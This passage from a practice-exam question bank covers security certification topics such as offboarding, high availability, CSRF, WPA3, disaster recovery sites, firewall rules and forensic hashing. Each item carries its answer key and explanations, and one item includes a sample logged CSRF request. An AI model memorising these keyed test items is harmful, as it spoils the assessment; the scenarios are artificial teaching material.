  {t:"Ask the customer to prove identity and then erase the data",ok:false,x:"Identity verification is part of handling a request, but the decision to erase still belongs to the controller, not the processor."}
 ],
 w:"Data subject rights are exercised against the controller. A processor forwards the request and assists; it does not decide."},

{id:"b060",obj:"4.6",d:4,cat:"iam",t:"mc",
 q:"A contractor's engagement at a plant ended two months ago, but the contractor's VPN account and badge remained active and were later used by an unknown party. HR recorded the departure on the last day. Which of the following would have MOST effectively prevented this?",
 o:[
  {t:"Automated de-provisioning triggered by the HR system's termination record",ok:true,x:"Linking account and badge disablement to the authoritative HR event removes the dependency on someone remembering to file a ticket, closing the window on the day access should end."},
  {t:"Quarterly access recertification by the contractor's manager",ok:false,x:"Recertification is a valuable detective control but could leave a dormant account active for up to three months, which is what happened here."},
  {t:"Requiring the contractor to change the VPN password before leaving",ok:false,x:"An active account with a fresh password is still an active account; the problem is that access existed at all after the engagement ended."},
  {t:"Enforcing a stricter password complexity standard",ok:false,x:"Complexity does not matter when the account should not exist; the misuse was of a legitimate, un-revoked credential."}
 ],
 w:"Offboarding must be event-driven: HR termination automatically disables accounts, tokens, and badges the same day. Periodic reviews catch what automation misses."},


{id:"b061",obj:"3.4",d:3,cat:"arch",t:"mc",
 q:"A bank's core ledger database must keep accepting writes if the server hosting it fails, with the standby taking over the same storage and IP address within seconds and no transactions lost. Which of the following high-availability approaches BEST fits this requirement?",
 o:[
  {t:"A failover cluster with shared storage and a virtual IP",ok:true,x:"Clustering provides an active/passive pair that shares state; when the active node dies the passive node mounts the same data and adopts the virtual IP, preserving committed transactions."},
  {t:"A load balancer distributing writes across two independent database servers",ok:false,x:"Load balancing spreads stateless requests; two independent databases receiving different writes would diverge and corrupt the ledger."},
  {t:"Nightly replication to a warm site",ok:false,x:"A warm site with nightly copies means hours of downtime and up to a day of lost transactions, far from seconds and zero loss."},
  {t:"A content delivery network in front of the database",ok:false,x:"CDNs cache static content near users; they have no role in database write availability."}
 ],
 w:"Load balancing = spread stateless work across many nodes. Clustering = nodes share state so one can take over the other's role. Stateful databases need clustering."},

{id:"b062",obj:"2.2",d:2,cat:"social",t:"mc",
 q:"Customers of a neobank start receiving replies on a social media platform from an account using the bank's logo and a nearly identical handle, offering to 'verify' their accounts through a link that harvests credentials. Which of the following BEST describes this technique?",
 o:[
  {t:"Brand impersonation",ok:true,x:"The attacker copies the bank's visual identity and name to appear to be the bank's official support channel, exploiting customer trust in the brand."},
  {t:"Typosquatting",ok:false,x:"Typosquatting registers misspelled domain names to catch mistyped URLs; this attack lives on a social platform and relies on the logo and handle, not a mistyped domain."},
  {t:"Pretexting",ok:false,x:"Pretexting builds a fabricated story to justify a request; the lure here is the fake brand identity itself rather than an invented situation."},
  {t:"Disinformation campaign",ok:false,x:"Disinformation spreads false narratives to influence opinion; this attack's goal is direct credential theft."}
 ],
 w:"Brand impersonation borrows a trusted organization's identity (logo, name, style) on any channel. Typosquatting is specifically about lookalike domain names."},

{id:"b063",obj:"4.3",d:4,cat:"ops",t:"mc",
 q:"A bank's threat intelligence team wants timely, sector-specific indicators and early warnings about campaigns targeting financial institutions, shared confidentially by peer organizations and coordinated with regulators. Which of the following sources BEST meets this need?",
 o:[
  {t:"A financial sector information sharing and analysis center",ok:true,x:"ISACs are sector-specific communities where member organizations and government partners share indicators, tactics, and early warnings relevant to that industry under trusted terms."},
  {t:"Open-source intelligence from public blogs and social media",ok:false,x:"OSINT is broad and free but is neither sector-curated nor confidential; peer banks would not share sensitive incident details publicly."},
  {t:"Dark web monitoring for leaked credentials",ok:false,x:"Dark web feeds reveal stolen data and chatter but do not provide coordinated peer and regulator warnings about active campaigns."},
  {t:"The vendor's proprietary vulnerability feed",ok:false,x:"Vendor feeds cover product flaws generally; they are not built around confidential sharing among financial peers."}
 ],
 w:"Threat feeds: OSINT (public), proprietary (vendor), ISAC (sector peers plus government), dark web (criminal ecosystem). ISACs give sector context."},

{id:"b064",obj:"5.5",d:5,cat:"third",t:"mc",
 q:"A startup hires a firm to test its customer API. The testers are given API documentation and a standard customer account but no source code, no infrastructure diagrams, and no internal credentials. Which of the following BEST describes this engagement?",
 o:[
  {t:"A partially known environment test",ok:true,x:"The testers have some insider knowledge (documentation and a normal account) but not full access, placing the test between unknown and known environment approaches."},
  {t:"An unknown environment test",ok:false,x:"Unknown environment testing starts with no information beyond a target name; here documentation and an account were provided."},
  {t:"A known environment test",ok:false,x:"Known environment testing gives full internal detail such as source code, architecture, and admin credentials, which were withheld."},
  {t:"A defensive penetration test",ok:false,x:"Defensive testing evaluates the blue team's detection and response; this engagement is offensive testing of the API's security."}
 ],
 w:"Unknown = no info (simulates outsider); partially known = some info (simulates a user or partner); known = full info (deepest coverage)."},

{id:"b065",obj:"1.4",d:1,cat:"crypto",t:"mc",
 q:"A bank has two needs: full-disk encryption keys on 3,000 employee laptops must be released only when the laptop boots with unmodified firmware and bootloader, and the certificate authority's root signing key must be generated and used inside tamper-resistant hardware that never exposes it. Which of the following pairs is correct?",
 o:[
  {t:"TPM for the laptops; HSM for the CA root key",ok:true,x:"A TPM is a per-device chip that measures boot integrity and seals keys to it, ideal for disk encryption. An HSM is a dedicated appliance for high-value keys like a CA root, with tamper resistance and audited use."},
  {t:"HSM for the laptops; TPM for the CA root key",ok:false,x:"Deploying an HSM to every laptop is impractical and unnecessary, and a single TPM chip lacks the throughput, redundancy, and audit features expected of a CA's key store."},
  {t:"Key management service for both",ok:false,x:"A cloud KMS manages keys centrally but cannot measure a laptop's boot state, and the bank wants the root key generated in on-premises tamper-resistant hardware."},
  {t:"Secure enclave for both",ok:false,x:"A secure enclave isolates processing within a CPU on a device; it does not serve as the shared, hardened key store an enterprise CA requires."}
 ],
 w:"TPM = built-in chip per device (boot measurement, disk encryption keys). HSM = network or PCIe appliance for enterprise-critical keys (CA, payment). KMS = central key lifecycle."},

{id:"b066",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"A startup's application log shows the request below. The user whose session cookie appears did not intend to change anything and was reading an unrelated blog at the time. Which of the following attacks is indicated?",
 ex:"POST /account/email HTTP/1.1\nHost: app.example\nReferer: https://free-recipes.example/post/77\nCookie: session=8a1f...\nnew_email=attacker@203-0-113-5.example",
 o:[
  {t:"Cross-site request forgery",ok:true,x:"The request carries the victim's real session cookie but originated from a third-party page, meaning that page tricked the browser into submitting a state-changing form on the victim's behalf."},
  {t:"Stored cross-site scripting",ok:false,x:"XSS would show script content injected into the application; this is a legitimately formed request from another origin using the browser's ambient credentials."},
  {t:"Session hijacking via cookie theft",ok:false,x:"With hijacking, the attacker would send requests from their own machine; here the victim's own browser sent it, as the Referer shows."},
  {t:"SQL injection in the email field",ok:false,x:"The new_email value is a plain address with no query syntax; the attack is in who caused the request, not in its content."}
 ],
 w:"CSRF = victim's browser forced to send an authenticated request from another site. Defend with anti-forgery tokens and SameSite cookies."},

{id:"b067",obj:"4.1",d:4,cat:"harden",t:"mc",
 q:"A plant is replacing its floor Wi-Fi, which currently uses one shared passphrase that every contractor knows. The new design must authenticate each device with its own credential or certificate against the central directory, and use the strongest available encryption. Which of the following should be deployed?",
 o:[
  {t:"WPA3-Enterprise with 802.1X authentication against a RADIUS server",ok:true,x:"Enterprise mode replaces the shared passphrase with per-user or per-device EAP authentication via RADIUS tied to the directory, and WPA3 provides the current strongest encryption."},
  {t:"WPA3-Personal with a longer passphrase",ok:false,x:"Personal mode still uses one shared secret for everyone, so a departing contractor keeps working access and there is no per-device identity."},
  {t:"WPA2-Enterprise with a hidden SSID",ok:false,x:"Enterprise authentication is right, but WPA2 is not the strongest available and hiding the SSID adds no real security."},
  {t:"An open network with MAC address filtering",ok:false,x:"Open networks have no encryption and MAC addresses are trivially spoofed."}
 ],
 w:"Personal = shared PSK; Enterprise = 802.1X/EAP with RADIUS and individual credentials. Use WPA3 wherever clients support it."},

{id:"b068",obj:"3.4",d:3,cat:"data",t:"mc",
 q:"A trading firm's business impact analysis sets a recovery time objective of 15 minutes for its order-matching system. The firm is choosing a disaster recovery site. Which of the following site types is the ONLY one that can realistically meet this objective?",
 o:[
  {t:"A hot site with systems running and data replicated continuously",ok:true,x:"Only a hot site keeps duplicate systems live with near-real-time data, allowing failover in minutes. Any site that must be provisioned or restored cannot achieve 15 minutes."},
  {t:"A warm site with hardware installed and data restored from nightly backups",ok:false,x:"Restoring from backups and bringing systems up takes hours, and the nightly copies would also miss the firm's likely RPO."},
  {t:"A cold site with power, cooling, and rack space",ok:false,x:"A cold site has no equipment; procuring and installing systems takes days or weeks."},
  {t:"A geographically dispersed cold site in a different region",ok:false,x:"Geographic dispersion helps survive regional disasters, but a cold site is still empty space and cannot meet a 15-minute RTO."}
 ],
 w:"Hot = minutes (highest cost); warm = hours to a day; cold = days or weeks. The RTO drives the site choice."},

{id:"b069",obj:"5.4",d:5,cat:"gov",t:"mc",
 q:"After repeated failures to protect customer data, a regulator revokes a brokerage's authorization to operate in a particular jurisdiction until it can demonstrate remediation. Which of the following consequences of non-compliance has occurred?",
 o:[
  {t:"Loss of license",ok:true,x:"The regulator withdrew the brokerage's permission to conduct business, which is the loss-of-license consequence and one of the most severe outcomes of non-compliance."},
  {t:"Fines",ok:false,x:"A fine is a monetary penalty; the brokerage was not charged money but stopped from operating."},
  {t:"Contractual impacts",ok:false,x:"Contractual impacts arise when a customer or partner invokes penalty or termination clauses; this action came from the regulator, not a counterparty."},
  {t:"Reputational damage",ok:false,x:"Reputational harm will likely follow, but the specific consequence described is a regulatory action that halts operations."}
 ],
 w:"Non-compliance consequences: fines, sanctions, reputational damage, loss of license, and contractual impacts. Identify which one the scenario actually describes."},

{id:"b070",obj:"4.8",d:4,cat:"ir",t:"mc",
 q:"After recovering from an outage caused by a malicious script on a plant's engineering server, the IR team wants to determine the underlying reason the attacker was able to place the script, rather than just the sequence of events. Which of the following activities is this?",
 o:[
  {t:"Root cause analysis",ok:true,x:"RCA digs past the immediate trigger to the underlying condition, such as an unmonitored shared account or missing allow list, that made the incident possible, so it can be fixed permanently."},
  {t:"Threat hunting",ok:false,x:"Threat hunting proactively searches for undetected adversaries using hypotheses; it is not a post-incident causal review."},
  {t:"Tabletop exercise",ok:false,x:"A tabletop is a discussion-based rehearsal of a hypothetical incident, not analysis of a real one."},
  {t:"Chain of custody documentation",ok:false,x:"Chain of custody tracks who handled evidence; it preserves admissibility but does not explain why the incident occurred."}
 ],
 w:"Lessons learned reviews the response; root cause analysis explains why the incident was possible. Both feed back into preparation."},

{id:"b071",obj:"2.3",d:2,cat:"vulns",t:"ms",pick:2,
 q:"A plant issues tablets to maintenance technicians for viewing equipment manuals. An audit finds several tablets have been jailbroken and have apps installed from package files downloaded off the internet. Which TWO of the following are direct security consequences of these findings?",
 o:[
  {t:"Side-loaded packages bypass the app store's review and signing, so malware can be installed",ok:true,x:"Installing from arbitrary package files skips the vetting and signature checks that official stores provide, which is the core risk of side loading."},
  {t:"Jailbreaking removes OS protections, allowing apps to escalate privileges and defeat MDM controls",ok:true,x:"A jailbroken device gives apps root-level access, so sandboxing, encryption enforcement, and MDM policies can be bypassed or disabled."},
  {t:"The tablets will no longer be able to connect to Wi-Fi",ok:false,x:"Connectivity is unaffected; that is precisely why compromised tablets remain a risk to the network."},
  {t:"The tablets' batteries will fail because of unsigned code",ok:false,x:"Code signing status has no relationship to battery hardware."},
  {t:"The manuals stored on the tablets become encrypted by the OS",ok:false,x:"Jailbreaking weakens rather than adds encryption; it does not lock the user's own files."}
 ],
 w:"Mobile device vulns: side loading (unvetted apps) and jailbreaking/rooting (OS protections removed). MDM should detect both and block access."},

{id:"b072",obj:"3.1",d:3,cat:"arch",t:"mc",
 q:"A plant's safety controllers run a real-time operating system that must respond to sensor input within two milliseconds. The security team proposes installing an endpoint agent and enabling automatic patching on them. Which of the following is the BEST reason the OT engineers reject this?",
 o:[
  {t:"An RTOS needs deterministic timing; agents and unscheduled patches add latency or reboots that break safety limits",ok:true,x:"Real-time and embedded systems prioritize predictable responsiveness; unplanned CPU load or restarts can miss timing deadlines with physical consequences. Controls should be network-based and changes scheduled."},
  {t:"Safety controllers never have vulnerabilities",ok:false,x:"Embedded and RTOS devices frequently have vulnerabilities; the issue is how to mitigate them without harming determinism, not whether they exist."},
  {t:"Endpoint agents are only licensed for desktop operating systems",ok:false,x:"Licensing is not the concern; the architectural constraints of a real-time system are."},
  {t:"Patching is unnecessary because the controllers are air-gapped",ok:false,x:"The scenario does not state the controllers are air-gapped, and isolation is a compensating control rather than a reason vulnerabilities do not matter."}
 ],
 w:"RTOS/embedded considerations: responsiveness, inability to patch on demand, limited compute. Protect with segmentation, monitoring, and scheduled vendor-approved updates."},

{id:"b073",obj:"4.4",d:4,cat:"ops",t:"mc",
 q:"A bank's DLP system is tuned to block outbound emails containing account numbers. An audit discovers that a spreadsheet of account numbers was emailed to a personal address last month with no alert generated, because the numbers were formatted with spaces the DLP pattern did not expect. Which of the following BEST describes this outcome?",
 o:[
  {t:"A false negative",ok:true,x:"The control failed to flag a genuine policy violation; a real event went undetected, which is the definition of a false negative and the more dangerous error type."},
  {t:"A false positive",ok:false,x:"A false positive is an alert on benign activity; here no alert fired at all on malicious activity."},
  {t:"Alert fatigue",ok:false,x:"Alert fatigue is analysts ignoring excessive alerts; in this case there was no alert to ignore."},
  {t:"A true negative",ok:false,x:"A true negative is correctly not alerting on benign traffic; this traffic violated policy and should have been blocked."}
 ],
 w:"False positive = alert on nothing; false negative = silence on something real. Validate DLP patterns against real data formats and tune regularly."},

{id:"b074",obj:"5.3",d:5,cat:"third",t:"ms",pick:2,
 q:"A startup already has a master service agreement with a consulting firm. It now wants that firm to conduct a six-week review of its cloud architecture, during which the consultants will see unreleased product designs. Which TWO documents are needed for this specific engagement?",
 o:[
  {t:"A statement of work defining the review's scope, deliverables, timeline, and fees",ok:true,x:"The SOW is the per-engagement document that operates under the existing MSA and specifies exactly what this six-week review will produce."},
  {t:"A non-disclosure agreement covering the unreleased product designs",ok:true,x:"Because the consultants will see confidential designs, an NDA (or confirmation that the MSA's confidentiality terms cover this material) is required."},
  {t:"A new master service agreement",ok:false,x:"An MSA already exists; its terms govern this engagement, so another is redundant."},
  {t:"A memorandum of understanding between the two companies",ok:false,x:"An MOU expresses non-binding intent; the parties already have a binding contractual relationship."},
  {t:"A business partners agreement",ok:false,x:"A BPA is for joint ventures with shared profits; this is a paid consulting service."}
 ],
 w:"MSA once, SOW per project, NDA whenever confidential information changes hands. SLA if measurable service levels apply."},

{id:"b075",obj:"1.3",d:1,cat:"controls",t:"ms",pick:2,
 q:"A plant plans to upgrade the firmware on its production line PLCs. The change request notes the upgrade will require restarting the line's supervisory server, which other lines' dashboards also depend on. Which TWO change management elements MOST directly address these facts?",
 o:[
  {t:"Impact analysis documenting the dependency of other lines' dashboards on the server",ok:true,x:"Impact analysis identifies what else is affected by the change; the shared dependency is exactly the kind of consequence it must capture."},
  {t:"A maintenance window scheduled when the restart causes the least production disruption",ok:true,x:"Because the change forces a service restart and downtime, it must be scheduled in an approved window agreed with the affected stakeholders."},
  {t:"Updating the acceptable use policy for plant operators",ok:false,x:"The AUP governs user behavior; it has nothing to do with scheduling a firmware upgrade."},
  {t:"Adding the PLC vendor to the approved vendor list",ok:false,x:"Vendor approval is a procurement matter and does not address the restart or the dependency."},
  {t:"Disabling the honeypot on the OT network during the upgrade",ok:false,x:"A honeypot is unrelated to the change and should remain in place to detect misuse of the maintenance window."}
 ],
 w:"Change management: approval, ownership, stakeholders, impact analysis, test results, backout plan, maintenance window, SOP. Restarts and dependencies are 'technical implications' to plan for."},

{id:"b076",obj:"2.1",d:2,cat:"actors",t:"mc",
 q:"A bank's systems are encrypted by a group that also copied customer records and threatens to publish them on a leak site unless a cryptocurrency payment is made. The group operates a support chat and a public affiliate program. Which of the following BEST describes the actor and motivation?",
 o:[
  {t:"Organized crime motivated by financial gain",ok:true,x:"Double extortion (encrypt plus threaten to leak), affiliate programs, and professional 'customer support' are hallmarks of ransomware-as-a-service run by organized criminal groups for profit."},
  {t:"Nation-state actor motivated by espionage",ok:false,x:"State actors seeking intelligence stay hidden; publicly extorting for cryptocurrency and running an affiliate program is a commercial operation."},
  {t:"Hacktivist motivated by political beliefs",ok:false,x:"Hacktivists publish data to make a point; they do not typically offer to withhold it in exchange for payment."},
  {t:"Insider threat motivated by revenge",ok:false,x:"A public affiliate program and a leak site indicate an external criminal enterprise, not a single disgruntled employee."}
 ],
 w:"Organized crime = financially motivated, well resourced, businesslike (RaaS, affiliates, negotiation portals). Double extortion adds blackmail to service disruption."},

{id:"b077",obj:"4.6",d:4,cat:"iam",t:"mc",
 q:"A brokerage requires traders to log in by inserting a hardware security key and entering a PIN on the keypad of that same key. A new analyst argues this is not true multifactor authentication because it is a single device. Which of the following is the BEST response?",
 o:[
  {t:"It is MFA because the key is something you have and the PIN is something you know",ok:true,x:"Factors are defined by their nature, not by their packaging. Possessing the key and knowing the PIN are two independent factor types, so the login is multifactor."},
  {t:"It is not MFA because both factors are entered on the same device",ok:false,x:"Using one device does not merge the factors; an attacker who steals the key still lacks the PIN, and one who learns the PIN still lacks the key."},
  {t:"It is not MFA because a PIN is weaker than a password",ok:false,x:"PIN strength affects the quality of the knowledge factor, not whether it is a distinct factor."},
  {t:"It is MFA only if a fingerprint is also required",ok:false,x:"Adding a biometric would make it three factors, but two are sufficient for multifactor."}
 ],
 w:"Something you know (PIN, password), have (key, token, phone), are (biometric), somewhere you are (location). MFA needs two different types, regardless of form factor."},

{id:"b078",obj:"2.3",d:2,cat:"vulns",t:"mc",
 q:"A startup discovers that a cloud storage bucket holding customer identity documents was readable by anyone on the internet for eight months. The bucket was created by an engineer who accepted the provider's default settings at the time and never revisited them. Which of the following BEST describes the vulnerability?",
 o:[
  {t:"A cloud-specific misconfiguration",ok:true,x:"Cloud storage permissions are entirely the customer's responsibility; leaving access settings wider than intended is a misconfiguration class specific to cloud services and one of the most common causes of breaches."},
  {t:"A zero-day in the storage service",ok:false,x:"No flaw in the provider's software was exploited; the service worked exactly as configured."},
  {t:"VM escape from a neighboring tenant",ok:false,x:"No hypervisor boundary was crossed; the data was simply published to the internet by its permissions."},
  {t:"A cryptographic vulnerability in the bucket's encryption",ok:false,x:"Encryption at rest does not help when the service itself authorizes anonymous reads and decrypts on delivery."}
 ],
 w:"Cloud-specific vulnerabilities are usually misconfigurations: public storage, over-permissive roles, exposed management interfaces. Use guard rails and configuration scanning."},

{id:"b079",obj:"5.2",d:5,cat:"gov",t:"mc",
 q:"A plant's business impact analysis lists a robotic welder with a mean time between failures of 4,000 hours and a mean time to repair of 6 hours. The maintenance manager asks what the MTTR figure tells them. Which of the following is the BEST answer?",
 o:[
  {t:"On average, restoring the welder to service after a failure takes about six hours",ok:true,x:"MTTR measures the average duration of repair once something breaks, which is a key input to how much downtime each failure contributes and whether the RTO can be met."},
  {t:"The welder is expected to fail about every six hours",ok:false,x:"Failure frequency is described by MTBF (4,000 hours), not MTTR."},
  {t:"The welder can be down for at most six hours before production losses become unacceptable",ok:false,x:"That describes the RTO, a business tolerance, not the measured repair time."},
  {t:"The welder loses six hours of production data on each failure",ok:false,x:"Data loss tolerance is the RPO; MTTR is about repair duration, not data."}
 ],
 w:"MTBF = how often it breaks; MTTR = how long it takes to fix; RTO = how long you can tolerate; RPO = how much data you can lose."},

{id:"b080",obj:"4.5",d:4,cat:"ops",t:"mc",dg:"fwrules",
 q:"A plant's firewall between the corporate network (10.10.0.0/16) and the OT DMZ (10.20.5.0/24) has the rule set below. During a review, an engineer notices that a corporate workstation was able to open a remote desktop session to the historian at 10.20.5.9. Which of the following rules allowed this?",
 ex:"#  ACTION  SRC              DST             PORT    NOTE\n1  ALLOW   10.10.7.5        10.20.5.9       3389    Admin jump host RDP\n2  ALLOW   10.10.0.0/16     10.20.5.9       443     Dashboard\n3  ALLOW   10.10.0.0/16     10.20.5.0/24    ANY     Temp - troubleshooting\n4  DENY    ANY              10.20.5.0/24    ANY     Default deny",
 o:[
  {t:"Rule 3, because it permits any port from the entire corporate network into the whole OT DMZ",ok:true,x:"Rule 3 is a wide-open 'temporary' allow that was never removed; it matches RDP from any corporate host before the default deny is reached."},
  {t:"Rule 1, because it allows RDP to the historian",ok:false,x:"Rule 1 permits RDP only from the specific jump host 10.10.7.5, which is intended; a general workstation would not match its source."},
  {t:"Rule 2, because port 443 can tunnel RDP",ok:false,x:"Rule 2 only allows HTTPS to the historian; a plain RDP session on 3389 does not match it."},
  {t:"Rule 4, because the default deny is in the wrong position",ok:false,x:"The default deny is correctly last; the problem is the overly broad allow above it, not the deny's placement."}
 ],
 w:"Firewalls process rules top-down, first match wins. 'Temporary' any/any rules are a classic misconfiguration; review rule sets regularly and expire exceptions."},

{id:"b081",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"A plant's PLC vendor verifies firmware integrity by comparing an MD5 digest published on its website. Researchers demonstrate that they can craft two different firmware images, one benign and one malicious, that produce the same MD5 digest, so a digest check cannot tell them apart. Which of the following attacks does this demonstrate?",
 o:[
  {t:"Hash collision attack",ok:true,x:"Two different inputs producing the same digest is a collision; MD5 is broken in this respect, so a digest match no longer proves the firmware is authentic."},
  {t:"Downgrade attack",ok:false,x:"A downgrade forces the use of a weaker protocol version during negotiation; here no protocol was negotiated, the hash algorithm itself was defeated."},
  {t:"Replay attack",ok:false,x:"Replay reuses a captured valid message; the researchers created new malicious content, not a copy of old traffic."},
  {t:"Pass-the-hash attack",ok:false,x:"Pass-the-hash reuses a stolen password hash to authenticate; it has nothing to do with file integrity checks."}
 ],
 w:"Collision = two inputs, one hash. MD5 and SHA-1 are collision-broken; use SHA-256 and, better, digital signatures for firmware."},

{id:"b082",obj:"4.8",d:4,cat:"ir",t:"mc",
 q:"A bank's forensics team images the disk of a compromised server before analysis. Months later, defense counsel argues the image analyzed in court could have been altered after acquisition. Which of the following should the team have recorded at acquisition time to refute this claim?",
 o:[
  {t:"A cryptographic hash of the image, verified against the original and re-verified before analysis",ok:true,x:"Recording SHA-256 digests at acquisition and confirming they still match later proves the evidence is bit-for-bit unchanged, supporting both integrity and the chain of custody."},
  {t:"The CVSS score of the vulnerability exploited on the server",ok:false,x:"A severity score describes the vulnerability; it says nothing about whether the evidence copy was modified."},
  {t:"A screenshot of the server's login page",ok:false,x:"A screenshot is not a verifiable representation of disk contents and cannot prove the image was unaltered."},
  {t:"The server's uptime at the moment of imaging",ok:false,x:"Uptime is useful context but has no bearing on the integrity of the acquired image."}
 ],
 w:"Forensic integrity: hash at acquisition, work on copies, re-hash before analysis and presentation, and log every handoff in the chain of custody."},

{id:"b083",obj:"5.6",d:5,cat:"third",t:"mc",
 q:"A plant's awareness program teaches staff to notice and report a coworker who starts working unusual hours, copies large volumes of engineering files, and reacts angrily when asked about it, and provides a confidential reporting channel. Which of the following awareness topics does this MOST directly address?",
 o:[
  {t:"Insider threat and anomalous behavior recognition",ok:true,x:"Training staff to spot behavioral warning signs in colleagues and report them safely is the insider-threat component of security awareness."},
  {t:"Phishing recognition",ok:false,x:"Phishing training concerns identifying deceptive messages; this scenario involves a person's on-site behavior, not email."},
  {t:"Removable media handling",ok:false,x:"Media policy covers how USB devices may be used; the training here is about recognizing a risky individual regardless of medium."},
  {t:"Hybrid and remote work security",ok:false,x:"Remote-work guidance covers home networks and devices; the concern is an on-site employee's conduct."}
 ],
 w:"Awareness programs include phishing, social engineering, password hygiene, removable media, remote work, and insider threat with anomalous behavior recognition and reporting."},

{id:"b084",obj:"3.4",d:3,cat:"data",t:"mc",
 q:"A bank wants to validate that its disaster recovery site can process a full day of real transactions correctly, but regulators forbid any interruption to the production system during the test. Which of the following testing methods should be used?",
 o:[
  {t:"Parallel processing, running the recovery site alongside production on the same inputs and comparing results",ok:true,x:"Parallel processing exercises the recovery systems with real workload while production continues untouched; output comparison proves the site would produce correct results."},
  {t:"A failover test that switches production to the recovery site",ok:false,x:"Failover proves the switch works, but it interrupts production, which the regulators prohibited."},
  {t:"A tabletop exercise walking through the DR plan",ok:false,x:"A tabletop is discussion only; it cannot validate that the site actually processes transactions correctly."},
  {t:"A simulation in which staff practice restoring from backups to a lab",ok:false,x:"A lab restore checks procedures and backups but does not demonstrate the real recovery site handling a real day's transactions."}
 ],
 w:"Resilience tests: tabletop (talk), simulation (practice), parallel processing (run both, compare), failover (actually switch). Choose based on assurance needed versus disruption allowed."},

{id:"b085",obj:"4.1",d:4,cat:"harden",t:"mc",
 q:"A startup wants to catch injection flaws and hardcoded secrets in its own source code every time a developer opens a pull request, before the application is ever built or deployed. Which of the following BEST meets this need?",
 o:[
  {t:"Static code analysis integrated into the CI pipeline",ok:true,x:"Static analysis inspects source code without executing it, so it can run on every pull request and flag dangerous patterns and embedded credentials before a build exists."},
  {t:"Dynamic application testing against the staging environment",ok:false,x:"Dynamic testing requires a running application, so it happens after build and deployment rather than at pull request time."},
  {t:"Code signing of the release artifacts",ok:false,x:"Signing proves who produced a build and that it was not altered; it does not find vulnerabilities in the code."},
  {t:"Sandboxing the application at runtime",ok:false,x:"A sandbox limits damage from a running application; it does not inspect source code for flaws."}
 ],
 w:"Static analysis = source code, pre-build, shift-left. Dynamic analysis = running app. Code signing = integrity and origin. Sandboxing = runtime containment."},
];
